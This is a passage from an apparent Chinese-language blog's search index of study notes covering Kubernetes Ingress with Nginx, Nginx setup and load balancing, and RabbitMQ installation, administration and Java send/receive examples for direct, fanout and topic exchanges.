来创建一个统一的负载均衡器，从而实现当用户访问不同的域名时，访问后端不同的服务。Ingress 的功能其实很容易理解：所谓 Ingress 就是 Service 的“Service”，这就是它们两者的关系。\n在 Kubernetes（K8s）中，Ingress Controller 默认是 Traefik，它为云原生和动态环境设计，可以监听k8s的资源变化。但这里还是使用 Nginx 作为流量入口管理器，虽然它比较偏静态。\n首先卸载默认的 Traefik：\nhelm uninstall traefik -n kube-systemhelm uninstall traefik-crd -n kube-system\n\n然后使用 Helm 安装 Nginx：\nhelm repo add ingress-nginx https://kubernetes.github.io/ingress-nginxhelm repo updatehelm install nginx-ingress ingress-nginx/ingress-nginx -n kube-system\n\n或者使用 kubectl 安装：\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.12.1/deploy/static/provider/baremetal/deploy.yaml\n\n使用以下ingress.yaml创建 Ingress 资源：\napiVersion: networking.k8s.io/v1kind: Ingressmetadata:  name: ingress  annotations:    nginx.ingress.kubernetes.io/rewrite-target: /$2 # 路径重写，去掉 /user    nginx.ingress.kubernetes.io/upstream-hash-by: &quot;$remote_addr&quot; # 负载均衡spec:  rules:    - host: &quot;&quot;  # 留空，表示使用 IP 地址      http:        paths:          - path: /user(/|$)(.*)            pathType: ImplementationSpecific            backend:              service:                name: user-service  # 目标服务名                port:                  number: 8000  # user-service 服务的 HTTP 端口\n\n使用 kubectl apply -f ingress.yaml 创建 Ingress 资源后，就可以通过 http://master/user 访问到后端服务了。\n到这里基本应用的部署就完成了。\n","categories":["学习笔记"],"tags":["Kubernetes"]},{"title":"Nginx笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Nginx%E7%AC%94%E8%AE%B0/","content":"关于NginxNginx是一个轻量的web服务器&#x2F;反向代理服务器&#x2F;电子邮件代理服务器，占用内存少，并发能力强。nginx是由c语言开发的。  \n反向代理反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。  \n反向代理隐藏了真正的服务端。\n正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。比如vpn。  \n环境搭建安装nginx官网nginx安装需要相关的依赖库，否则配置和编译会出现错误。gcc编译器、openssl库、pcre库、zlib库一次安装命令：yum install gcc openssl-devel pcre pcre-devel zlib zlib-devel -y\n然后解压缩官网下载的nginx压缩包。配置安装目录./configure --prefix=/安装目录编译make安装make install\n普通启动运行sbin目录下的nginx文件./nginxnginx由master进程和worker进程组成。master进程读取配置文件，并维护worker进程，而worker进程则对请求进行实际处理。\n启动成功后，访问80端口便会出现如下欢迎页面：\n通过配置文件启动-c 参数指定配置文件绝对路径./nginx -c nginx.conf配置文件绝对路径\n关闭\n优雅的关闭找出进程号，执行下面的命令kill -QUIT 主pidpid是主进程号，即master process。其他worker process为子进程。这种关闭方式会使nginx不再接受新的请求，等待nginx处理完请求后再关闭。\n\n快速关闭kill -TERM 主pid直接关闭，比较暴力。或者直接kill。\n\n\n重启一般用于修改配置，重启服务器。./nginx -s reload\n其他在启动命令后加 -t 会检查配置文件是否正确successful是正确，failed是失败。只能检查语法错误（废话）  \n查看版本\n# 查看nginx版本。./nginx -v# 查看nginx版本、编译器版本和配置参数./nginx -V\n\n配置文件#配置worker进程运行用户，默认用户为nobody。nobody用户一般用于启动程序，没有密码。  #user nobody;  #配置工作进程数量，通常等于cpu数量或2倍于cpu数量。  worker_processes 1;  #配置全局错误日志及类型，[debug | info | notice | warn | error | crit]，默认为error。  error_log logs/error.log;  #error_log logs/error.log info;#配置进程pid文件，记录pid号，每次启动都会更新。  pid logs/nginx.pid  #配置工作模式和连接数  events&#123;    worker_connections 1024;  ##配置每个worker进程连接上限，上限65535。nginx支持总连接数等于 worker_connection * worker_processes&#125;#配置http服务器，利用反向代理功能提供负载均衡支持  http&#123;    #配置nginx支持哪些多媒体类型，可以在conf/mime.types查看支持哪些多媒体类型      include mime.types      #默认文件类型 流类型，可以理解支持任意类型      default_type application/octet-stream      #配置日志格式      #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;      #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;      #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;      #配置access.log日志及存放路径，并使用上面定义的main日志格式      #access_log  logs/access.log  main;      #开启高效文件传输模式      sendfile     on;        #防止网络阻塞      #tcp_nopush   on;      #长连接超时时间，单位秒    #keepalive_timeout  0;    keepalive_timeout  65;    #开启gzip压缩输出    #gzip  on;        #配置虚拟主机，可以有多个server    server&#123;            #配置监听端口        listen       80;        #配置服务名        server_name  localhost;        #配置字符集        #charset koi8-r;        #配置本虚拟主机的访问日志        #access_log  logs/host.access.log  main;        #默认的匹配斜杠/（根路径）的请求，当访问路径中有/，会被该location匹配到并进行处理        location / &#123;            #root是配置服务器的默认网站根目录的位置，默认为nginx安装目录下的html目录            root   html;            #配置首页文件的名称            index  index.html index.htm;        &#125;                #配置404页面        #error_page  404              /404.html;                #配置50x错误页面        error_page   500 502 503 504  /50x.html;        location = /50x.html &#123;            root   html;        &#125;        #精确匹配，拦截各种请求。        # proxy the PHP scripts to Apache listening on 127.0.0.1:80        #        #location ~ \\.php$ &#123;        #    proxy_pass   http://127.0.0.1;        #&#125;        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000        #        #location ~ \\.php$ &#123;        #    root           html;        #    fastcgi_pass   127.0.0.1:9000;        #    fastcgi_index  index.php;        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        #    include        fastcgi_params;        #&#125;        # deny access to .htaccess files, if Apache&#x27;s document root        # concurs with nginx&#x27;s one        #        #location ~ /\\.ht &#123;        #    deny  all;        #&#125;    &#125;&#125;\n\n静态网站部署修改配置文件  \nlocation /项目名（请求根路径） &#123;    root  /项目根路径    index index.html&#125;\n重启nginx即可访问。  \n\nindex.html 磁盘存放路径为 &#x2F;项目根路径&#x2F;项目名&#x2F;index.html访问的url为 ip:port&#x2F;项目名&#x2F;index.html\n\n负载均衡负载均衡通常指将请求均匀地分摊到集群的多个服务器节点上执行，这里均匀指在比较大的统计范围内是基本均匀的，并不是完全均匀的。  \n硬件负载均衡比如 F5、深信服、Array 等优点是有厂商专业技术团队提供支持，性能稳定。缺点是费用昂贵。  \n软件负载均衡比如 Nginx、LVS、HAProxy 等优点是开源免费，成本低。  \nnginx负载均衡示例：www.example.com修改配置文件server中添加\nlocation / &#123;    proxy_pass http://www.example.com;&#125;\nserver上添加\nupstream www.example.com &#123;    server 127.0.0.1:8081    server 127.0.0.1:8082&#125;\n\nnginx负载均衡策略\n轮询（默认）每个请求会按时间顺序逐一分配到不同的后端服务器。如果服务器down掉了，会自动剔除。一般后端服务器性能接近。\n权重通过权重值分发请求，值越大访问的比例越大，用于后端服务器性能不均的情况。参数 weight=1\n最少连接请求会被转发到链接数最少的服务器上。在upstream中添加 least conn;\nip_haship_hash也叫ip绑定，每个请求按访问ip的hash值分配，这样每个访问客户端会固定访问一个后端服务器，可以解决session会话丢失的问题。在upstream中添加 ip hash;\n\n其他配置  \n\n参数 backup 标记该服务器为备用服务器。当主服务器停止时，请求会被转发到这里。  \n参数 down 标记该服务器停机。\n\n静态代理将所有静态资源访问改为访问nginx，而不是tomcat。因为nginx更擅长静态资源的处理，性能更好，效率更高。  \n在配置文件中，配置静态资源所在目录\nlocation ~.*/(css|js|img|images)&#123;    root /web/static;&#125;\n\n\n正则匹配目录，比匹配后缀会好一些。\n\n动静分离\n","categories":["学习笔记"],"tags":["Nginx"]},{"title":"RabbitMQ笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/RabbitMQ%E7%AC%94%E8%AE%B0/","content":"概述什么是消息队列消息（message）是指在应用之间传送的数据。可以是简单的纯文本字符串，也可以很复杂，包含嵌入对象。\n消息队列（message queue）是一种应用间的通信方式，消息发送后立即返回，由消息系统来确保可靠传递。消息发布者只管把消息发布到MQ中而不管谁来取，消息使用者只管从MQ中取消息而不管谁发布。这样发布者和使用者都不需要知道对方的存在。\n为什么使用消息队列消息队列是一种应用之间的异步协作机制。\n例如驿站收发快递。快递员并不需要知道收件人的具体信息，只用送到对应驿站即可；收件人也并需要不知道快递员具体信息，只需到驿站取即可。但传统收发快递，快递员得等收件人接收后，再去送下一个快递。导致效率的降低。再例如订单系统。下单后的逻辑可能包括：扣减库存、生成订单信息、发送短信通知、发红包。最开始这些逻辑是放在一起同步执行。但为了提高服务效率，有些不需要立即生效的操作可以拆分出来异步执行，如发短信通知、发红包等。这种场景可以使用MQ，在主流程（扣减库存、生成订单）执行完毕后发送一条消息到MQ，由另外的线程拉取MQ的消息（或由MQ推送），执行相应的业务逻辑。\n以上是用于业务解耦的情况，其他常见场景包括最终一致性、广播、错峰控流等。\nRabbitMQ特点RabbitMQ是由Erlang语言开发的AMQP的开源实现。AMQP（Advanced Message Queuing Protocol）：高级消息队列协议。是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端&#x2F;中间件不同产品，不同的开发语言等条件的限制。RabbitMQ最初起源于金融系统，用于在分布式系统中存储转发消息。在易用性、扩展性、高可用性等方面表现都不错。特点：\n\n可靠性（Reliability）使用持久化、传输确认、发布确认等机制来保证可靠性。\n灵活的路由（Flexible Routing）在消息进入队列之前，通过Exchange来路由消息。对于典型的路由功能，RabbitMQ提供了一些内置的Exchange实现。对于复杂的路由功能，可以将多个Exchange绑定在一起，也可以通过插件机制实现自己的Exchange。\n消息集群（Clustering）多个RabbitMQ服务器可以组成一个集群，形成一个逻辑Broker。\n高可用（Highly Availability Queues）队列可以在集群中的机器上进行镜像，防止单点故障。\n多种协议（Multi-protocol）RabbitMQ支持多种消息队列协议，如 STOMP、MQTT等。\n多语言客户端（Many Clients）RabbitMQ支持很多常用语言，如Java、.net、Ruby等。\n管理界面（Management UI）RabbitMQ提供了一个易用的用户界面，使用户可以监控和管理消息Broker的许多方面。\n跟踪机制（Tracing）如果消息异常，RabbitMQ提供了消息跟踪机制，使用者可以赵卒发生了什么。\n\nRabbitMQ安装安装RabbitMQ官网Erlang官网Erlang和RabbitMQ版本对照\n依赖包安装 yum install gcc glibc-devel make ncurses-devel openssl-devel xmlto -y解压erlang源码包 tar -zxvf otp_src_25.0.4.tar.gz创建erlang的安装目录 mkdir /usr/local/erlang进入erlang的解压目录 cd otp_src_25.0.4配置erlang的安装信息 ./configure --prefix=/usr/local/erlang --without-javac编译安装 make &amp;&amp; make install配置环境变量 vim /etc/profile添加如下内容：\nERL_HOME=/usr/local/erlangPATH=$ERL_HOME/bin:$PATHexport ERL_HOME PATH\n更新环境变量 source /etc/profile查看erlang版本 erl -version如上图，即为安装成功。然后开始安装RabbitMQ。\n安装RabbitMQ rpm -ivh --nodeps rabbitmq-server-3.10.7-1.el8.noarch.rpm\nRabbitMQ常用命令启动与关闭启动 rabbitmq-server start\n\n可能会出现错误，错误原因是&#x2F;var&#x2F;lib&#x2F;rabbitmq&#x2F;.erlang.cookie文件权限不够解决方案：chmod rabbitmq:rabbitmq/var.lib.rabbitmq/.erlang.cookie chmod 400 /var/lib/rabbitmq/.erlang.cookie\n\n停止服务 rabbitmqctl stop\n插件管理添加插件 rabbitmq-plugins enable {插件名}\n\nRabbitMQ启动后可以使用浏览器进入管控台，但默认情况RabbitMQ不允许直接使用浏览器访问。默认访问端口 15672因此需要添加插件 rabbitmq-plugins enable rabbitmq_management\n\n删除插件 rabbitmq-plugins disable {插件名}\n用户管理浏览器访问管控台：\n默认用户密码均为 guest但只能本机登录，否则报错User can only log in via localhost\n添加用户 rabbitmqctl add_user {username} {password}删除用户 rabbitmqctl delete_user {username}修改密码 rabbitmqctl change_password {username} {newpassword}设置用户角色 rabbitmqctl set_user_tags {username} {tag}\ntag参数表示用户角色取值为：management、monitoring、policymaker、administrator角色详解：\nmanagement：用户可以通过AMQP做的任何事外加\n\n列出自己可以通过AMQP登入的 virtual hosts\n查看自己的 virtual hosts 中的 queues、exchanges 和 bindings\n查看和关闭自己的 channels 和 connections\n查看有关自己的 virtual hosts 的“全局”的统计信息，包含其他用户在这些 virtual hosts 中的活动\n\npolicymaker：management 可以做的任何事外加\n\n查看、创建和删除自己的 virtual hosts 所属的 policies 和 parameters\n\nmonitoring：management 可以做的任何事外加\n\n列出所有的 virtual hosts ，包括他们不能登录的 virtual hosts\n查看其他用户的 connections 和 channels\n查看节点级别的数据如 clustering 和 memory 使用情况\n查看真正的关于所有 virtual hosts 的全局统计信息\n\nadministrator：policymaker 和 monitoring 可以做的任何事外加\n\n创建和删除 virtual hosts\n查看、创建和删除 users\n查看、创建和删除 permissions\n关闭其他用户的 connections\n\n权限管理授权命令 rabbitmqctl set permissions [-p vhostpath] {user} {conf} {write} {read}-p vhostpath:用于指定一个资源的命名空间，例如 -p &#x2F; 表示根路径命名空间user：用于指定要为哪个用户授权填写用户名conf：一个正则表达式match 哪些配置资源能被该用户配置write：一个正则表达式match 哪些配置资源能被该用户写read：一个正则表达式match 哪些配置资源能被该用户读\n查看指定命名空间下的用户权限 rabbitmqctl list permissions [vhostpath]\n查看指定用户下的权限 rabbitmqctl list user_permissions {username}\nvhost管理vhost是RabbitMQ中的一个命名空间，可以限制消息存放位置，利用这个命名空间进行权限的控制。类似windows文件夹，在不同文件夹存放不同文件。\n添加vhost rabbitmqctl add vhost temp删除vhost rabbitmqctl delete vhost {name}\n消息的发送和接收消息发送和接收机制所有的mq产品从模型抽象上来说都是一样的过程：消费者订阅某个队列。生产者创建消息，然后发布到队列中，最后将消息发送到监听的消费者。\n\n\nMessage：消息，消息是不具体的，它由消息头和消息体组成。消息体是不透明的，而消息头则由一系列可选属性组成，这些属性包括 routing-key （路由键）、 priority （相对于其他消息的优先权）、 delivery-mode （指出该消息可能需要持久性存储）等。\nPublisher：消息的生产者，也是一个向交换器发布消息的客户端程序。\nExchange：交换机，用来接收生产者发送的消息并将这些消息路由给服务器中的队列。\nBinging：绑定，用于消息队列和交换器之间的关联。一个绑定就是基于路由键将交换器和消息队列连接起来的路由规则，所以可以将交换器理解成一个由绑定构成的路由表。\nQueue：消息队列，用来保存消息直到发送给消费者。他是消息的容器，也是消息的终点。一个消息可以投入一个或多个队列。消息一直在队列里面，等待消费者连接到这个队列将其取走。\nConnection：网络连接，比如一个TCP连接。\nChannel：信道，多路复用连接中的一条独立的双向数据流通道。信道是建立在真实的TCP连接内的虚拟连接，AMQP命令都是通过信道发送出去的，不管是发布消息、订阅队列还是接收消息，都是通过信道完成的。因为对于操作系统来说，建立和销毁TCP连接开销较大，所以引入信道的概念，以复用一条TCP连接。\nConsumer：信息的消费者，表示一个从消息队列中取得消息的客户端应用程序。\nVirtual Host：虚拟主机，表示一批交换器、消息队列和相关对象。虚拟主机是共享相同的身份认证和加密环境的独立服务器域。每个vhost本质是一个缩小版的RabbitMQ服务器，有自己的队列、交换器、绑定和权限机制。vhost是AMQP概念的基础，必须在连接时指定，RabbitMQ默认的vhost是&#x2F;。\nBroker：表示消息队列服务器实体。\n\nAMQP中的消息路由生产者将消息发布到Exchange上，消息最终到达队列并被消费者接收，而binding决定交换器的消息应该发送到哪个队列。\nExchange类型Exchange分发消息时根据类型的不同分发策略有区别，有四种类型：direct、fanout、topic、headers。headers 匹配AMQP消息的 header 而不是路由键，此外 headers 交换器和 direct 交换器完全一致，但性能差很多。几乎用不到了。\n\ndirect消息中的路由键如果和 Binding 中的 binding key 一致，交换器就将消息发送到对应的队列中。路由键与队列名完全一致。他是完全匹配、单播模式。如果没有 binding key 与路由键一致，数据会丢失。\n\nfanout每个发到 fanout 类型交换器的消息都会分到所有绑定的队列上去。fanout 交换器不处理路由键，只是简单的将队列绑定到交换器上，每个发送到交换器的消息会被转发到与该交换器绑定的所有队列上。类似广播，fanout 类型转发消息是最快的。\n\ntopictopic 交换器通过匹配模式分配消息的路由键属性，将路由键和某个模式进行匹配，此时队列需要绑定到一个模式上。他将路由键和绑定键的字符串切分成单词，这些单词之间用点隔开。它同样会识别两个通配符：’#’和’*‘。# 匹配0或多个单词，* 匹配一个单词。它也是一种广播，但是是有一定条件的广播。\n\n\nJava发送和接收Queuemaven依赖\n&lt;dependency&gt;  &lt;groupId&gt;com.rabbitmq&lt;/groupId&gt;  &lt;artifactId&gt;amqp-client&lt;/artifactId&gt;  &lt;version&gt;5.14.2&lt;/version&gt;&lt;/dependency&gt;\n\n消息发送：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class Send &#123;    public static void main(String[] args) &#123;        //创建连接工厂对象        ConnectionFactory factory = new ConnectionFactory();        //配置RabbitMQ的连接相关信息        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;//定义连接对象        Channel channel = null;//定义通道对象        try &#123;            connection = factory.newConnection();//实例化连接对象            channel = connection.createChannel();// 实例化通道对象            String message = &quot;hello MQ!&quot;;            //创建队列，名为myQueue            /*            参数1为 队列名            参数2为 是否持久化队列            参数3为 是否排外 如果排外则这个队列只允许一个消费者监听            参数4为 是都自动删除队列 为true表示当队列中没有消息，也没有消费者连接时会自动删除这个队列            参数5为 队列的一些属性设置，通常为null            注意：                1. 声明队列时，队列名称如果已经存在则放弃声明。如果不存在，则会声明一个新的队列                2. 队列名可以取值任意，但是要与消息接收时完全一致                3. 这行代码是可有可无的，但是一定要在发送消息前确认队列名称已经存在，否则会出现问题             */            channel.queueDeclare(&quot;myQueue&quot;, true, false, false, null);            //发送消息到指定队列            /*            参数1为 交换机名称，为空不使用交换机            参数2为 队列名或routing，当指定交换机名称后，这个值就是routingKey            参数3为 消息属性 通常为空            消息4为 具体的消息的字节数组            注意：队列名必须与接收时完全一致             */            channel.basicPublish(&quot;&quot;, &quot;myQueue&quot;, null, message.getBytes(StandardCharsets.UTF_8));            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n\n连接时，使用的端口号为 5672 。15672 是访问web时使用的。另外，注意用户是否有连接权限，以及端口是否开放。\n\n消息接收:\npackage org.example.rabbitmq;import com.rabbitmq.client.*;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class Receive &#123;    public static void main(String[] args) &#123;        //创建连接工厂对象        ConnectionFactory factory = new ConnectionFactory();        //配置RabbitMQ的连接相关信息        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;//定义连接对象        Channel channel = null;//定义通道对象        try &#123;            connection = factory.newConnection();//实例化连接对象            channel = connection.createChannel();// 实例化通道对象            channel.queueDeclare(&quot;myQueue&quot;, true, false, false, null);            //接收消息            /*            参数1为 当前消费者需要监听的队列名称 队列名必须要与发送时队列名完全一致            参数2为 消息是否自动确认。true表示自动确认，接受完消息会自动将消息从队列中溢出            参数3为 消息接收者的标签，用于当多个消费者同时监听一个队列时区分不同消费者，通常为空字符串            参数4为 消息接收的回调方法，这个方法具体完成对消息的处理代码            注意：使用了 basicConsume 方法后，会启动一个线程持续监听队列，如果队列中有新的数据进入，会自动接收消息                因此不能关闭通道和连接对象             */            channel.basicConsume(&quot;myQueue&quot;, true, &quot;&quot;, new DefaultConsumer(channel) &#123;                //消息的具体接收和处理方法                @Override                public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                    String message = new String(body, StandardCharsets.UTF_8);                    System.out.println(&quot;成功接收消息：&quot; + message);                &#125;            &#125;);            //不能关闭通道和连接，关闭可能会造成接收时抛出异常或无法接收消息            //channel.close();            //connection.close();        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\nJava绑定Exchange发送和接收消息AMQP协议中的核心思想是生产者和消费者解耦，生产者从不直接将消息发送给队列。生产者通常不知道是否一个消息会被发送到队列中，只是将消息发送到一个交换机。由 Exchange 来接收，然后 Exchange 根据特定的策略转发到 Queue 进行存储。Exchange 类似一个交换机，将各个消息分发到对应的队列。\n实际应用中只需要定义好 Exchange 的路由策略。生产者只面向 Exchange 发布消息，消费者只面向 Queue 消费消息，Exchange 定义消息的路由，将各个层面的消息隔离开，降低了整体的耦合度。\ndirect-消息发送与接收消息发送：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class SendDirect &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            String message = &quot;hello direct MQ!&quot;;            channel.queueDeclare(&quot;myDirectQueue&quot;, true, false, false, null);            //声明一个交换机            /*            参数1为 交换机的名称            参数2为 交换机的类型，取值 direct、fanout、topic、headers            参数3为 是否为持久化的交换机            注意：                声明交换机时，如果这个交换机已经存在，则会放弃声明。如果不存在，则声明交换机                这行代码是可有可无的，但是使用前必须确保这个交换机被声明             */            channel.exchangeDeclare(&quot;directExchange&quot;, &quot;direct&quot;, true);            //将队列绑定到交换机            /*            参数1为 队列的名称            参数2为 交换机名称            参数3为 消息的RoutingKey（BindingKey）            注意：                在进行队列和交换机的绑定时，必须确保交换机和队列已经成功声明             */            channel.queueBind(&quot;myDirectQueue&quot;, &quot;directExchange&quot;, &quot;directRoutingKey&quot;);            //发送消息到指定队列            /*            参数1为 交换机名称            参数2为 消息的RoutingKey 如果消息的RoutingKey和某个队列与交换机绑定的RoutingKey一致，那么这个消息就会发送到指定队列中            注意：                发送消息时必须确保交换机已经创建并且确保已经正确绑定到某个队列             */            channel.basicPublish(&quot;directExchange&quot;, &quot;directRoutingKey&quot;, null, message.getBytes(StandardCharsets.UTF_8));            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n消息接收：\npackage org.example.rabbitmq;import com.rabbitmq.client.*;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class ReceiveDirect &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();                        channel.queueDeclare(&quot;myDirectQueue&quot;, true, false, false, null);            channel.exchangeDeclare(&quot;directExchange&quot;, &quot;direct&quot;, true);            channel.queueBind(&quot;myDirectQueue&quot;, &quot;directExchange&quot;, &quot;directRoutingKey&quot;);            /*            监听某个队列并获取队列中的数据            注意：                当前被监听的队列必须已经存在并正确地绑定到了某个交换机中             */            channel.basicConsume(&quot;myDirectQueue&quot;, true, &quot;&quot;, new DefaultConsumer(channel) &#123;                @Override                public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                    String message = new String(body, StandardCharsets.UTF_8);                    System.out.println(&quot;成功接收消息：&quot; + message);                &#125;            &#125;);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\nfanout-消息发送与接收类似电视调频道，需要先调到指定频道才能看想要的节目。所以需要消费者先监听，才能接收到消息。\n消息接收：\npackage org.example.rabbitmq;import com.rabbitmq.client.*;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class ReceiveFanout &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            /*            由于 fanout 类型的交换机的消息是类似于广播的模式，它不需要绑定 RoutingKey            而又可能会有很多个消费者来接收这个交换机中的数据，因此创建队列是要创建一个随机的队列名称            没有参数的 queueDeclare方法会创建一个名字随机的队列            这个队列的数据是非持久的，是排外的（同时最多只允许有一个消费者监听当前队列），会自动删除（当没有任何消费者监听队列时，这个队列会自动删除）            getQueue方法用于获取这个随机的队列名             */            String queueName = channel.queueDeclare().getQueue();            channel.exchangeDeclare(&quot;fanoutExchange&quot;, &quot;fanout&quot;, true);            //将这个随机的队列绑定到交换机中，由于是fanout类型的交换机，因此不需要指定RoutingKey进行绑定            channel.queueBind(queueName, &quot;fanoutExchange&quot;, &quot;&quot;);            /*            监听某个队列并获取队列中的数据            注意：                当前被监听的队列必须已经存在并正确地绑定到了某个交换机中             */            channel.basicConsume(queueName, true, &quot;&quot;, new DefaultConsumer(channel) &#123;                @Override                public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                    String message = new String(body, StandardCharsets.UTF_8);                    System.out.println(&quot;成功接收消息：&quot; + message);                &#125;            &#125;);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n消息发送：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class SendFanout &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            String message = &quot;hello fanout MQ!&quot;;            /*            由于使用了fanout类型的交换机，因此消息接收方可能会有多个，不建议在消息发送时创建队列，以及绑定队列            建议在消费者中创建队列并绑定交换机            但是发送消息时至少应该确保交换机存在             *///            channel.queueDeclare(&quot;myDirectQueue&quot;, true, false, false, null);//            channel.queueBind(&quot;myDirectQueue&quot;, &quot;directExchange&quot;, &quot;directRoutingKey&quot;);            channel.exchangeDeclare(&quot;directExchange&quot;, &quot;direct&quot;, true);            channel.basicPublish(&quot;fanoutExchange&quot;, &quot;&quot;, null, message.getBytes(StandardCharsets.UTF_8));            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n明确指定队列名称并进行了和交换机的绑定，可以保证fanout类型的消息不会丢失但是这么写没有意义，因为消费者最终可能有很多，不能让所有消费者监听同一个队列\ntopic-消息发送与接收接收消息：\npackage org.example.rabbitmq;import com.rabbitmq.client.*;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class ReceiveTopic &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            channel.queueDeclare(&quot;topicQueue&quot;,true,false,false,null);            channel.exchangeDeclare(&quot;topicExchange&quot;, &quot;topic&quot;, true);            channel.queueBind(&quot;topicQueue&quot;, &quot;topicExchange&quot;, &quot;aa.*&quot;);            channel.basicConsume(&quot;topicQueue&quot;, true, &quot;&quot;, new DefaultConsumer(channel) &#123;                @Override                public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                    String message = new String(body, StandardCharsets.UTF_8);                    System.out.println(&quot;成功接收消息：&quot; + message);                &#125;            &#125;);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n发送消息：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class SendTopic &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        